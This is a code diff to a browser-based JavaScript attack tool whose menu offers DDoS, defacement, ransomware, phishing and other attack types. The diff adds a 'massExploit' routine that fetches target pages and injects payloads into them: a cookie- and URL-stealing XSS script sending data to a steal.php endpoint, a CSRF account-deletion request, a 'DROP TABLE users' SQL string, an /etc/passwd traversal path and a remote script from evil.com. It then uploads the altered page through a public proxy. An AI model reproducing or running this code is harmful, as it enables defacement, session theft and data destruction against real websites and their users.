@@ -31,6 +31,7 @@ class DDoS {
   this.log(`API Key generated: ${this.apiKey}`);
   this.setupResizeHandle();
   this.setupDragHandle();
+  this.setupTheme();
 
   this.availableProxies = [
    'socks5://127.0.0.1:9050',
@@ -38,8 +39,21 @@ class DDoS {
    'https://another.proxy.com:3128'
   ];
 
-  // Initialize UI based on attack type
   this.toggleCustomCodeArea();
+
+  this.autoFillTarget();
+ }
+
+ autoFillTarget() {
+  const params = new URLSearchParams(window.location.search);
+  const target = params.get('target');
+  if (target) {
+   this.targetInput.value = target;
+  }
+ }
+
+ setupTheme() {
+  document.body.style.backgroundColor = '#121212';
  }
 
  createLogArea() {
@@ -73,7 +87,7 @@ class DDoS {
 
  createAttackTypeSelect() {
   const attackTypeSelect = document.createElement('select');
-  const attackTypes = ['DDoS', 'Deface', 'Connect', 'Exploit', 'Brute Force', 'Custom', 'Ransomware', 'Phishing', 'Data Breach', 'Botnet', 'Zero-Day', 'SQL Inject', 'XSS'];
+  const attackTypes = ['DDoS', 'Deface', 'Connect', 'Exploit', 'Brute Force', 'Custom', 'Ransomware', 'Phishing', 'Data Breach', 'Botnet', 'Zero-Day', 'SQL Inject', 'XSS', 'Mass Exploit'];
   attackTypes.forEach(option => {
    const opt = document.createElement('option');
    opt.value = option.toLowerCase().replace(' ', '_');
@@ -271,6 +285,66 @@ class DDoS {
   } catch (error) {
    this.log(`Exploit failed: ${error}`);
   }
+ }
+
+ async massExploit() {
+  this.log('Starting mass exploit...');
+  const targets = ['http://example.com', 'http://example2.com', 'http://example3.com'];
+
+  for (const target of targets) {
+   this.log(`Attempting mass exploit on ${target}...`);
+   try {
+    const response = await fetch(target, {
+     method: 'GET',
+     mode: 'cors'
+    });
+    if (!response.ok) {
+     throw new Error(`HTTP error! status: ${response.status}`);
+    }
+    const content = await response.text();
+
+    const xssPayload = `<script>
+     (function(){
+      var i=(new Image).src='http://example.com/steal.php?c='+document.cookie;
+      setTimeout(function(){document.body.appendChild(document.createElement('iframe')).src='http://example.com/steal.php?l='+location.href;}, 2000);
+     })();
+     </script>`;
+    const sqliPayload = "'; DROP TABLE users; --";
+    const csrfPayload = `<script>
+     fetch('${target}', {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: {
+       'Content-Type': 'application/x-www-form-urlencoded'
+      },
+      body: 'csrf_token=12345&action=delete_account'
+     });
+     </script>`;
+
+    const lfiPayload = `../../../../etc/passwd`;
+    const rfiPayload = `<script src="http://evil.com/malicious.js"></script>`;
+
+    let injectedContent = content.replace('</body>', `${xssPayload}${csrfPayload}${rfiPayload}</body>`);
+    injectedContent = injectedContent.replace('<form>', `<input type="hidden" name="injection" value="${sqliPayload}"> <form>`);
+    injectedContent = injectedContent.replace('<img>', `<img src="${lfiPayload}">`);
+
+    const proxyUrl = `https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(target)}`;
+
+    await fetch(proxyUrl, {
+     method: 'PUT',
+     mode: 'no-cors',
+     headers: {
+      'Content-Type': 'text/html'
+      },
+      body: injectedContent
+     });
+
+     this.log(`Mass Exploit injected. Check target and logs.`);
+    } catch (error) {
+     this.log(`Mass Exploit failed: ${error}`);
+    }
+   }
+   this.log('Mass exploit completed.');
  }
 
  async deface(target) {
@@ -712,8 +786,6 @@ class DDoS {
     mode: 'no-cors',
     cache: 'no-cache',
     body: body,
-    //credentials: 'include',
-    //redirect: 'follow'
    })
    .then(() => this.log(`${method} request sent successfully via ${proxy}.`))
    .catch(err => this.log(`${method} request failed via ${proxy}: ${err}`));
@@ -785,6 +857,9 @@ class DDoS {
     break;
    case 'xss':
     this.xss(target);
+    break;
+   case 'mass_exploit':
+    this.massExploit();
     break;
    default:
     this.log('Invalid attack type selected.');
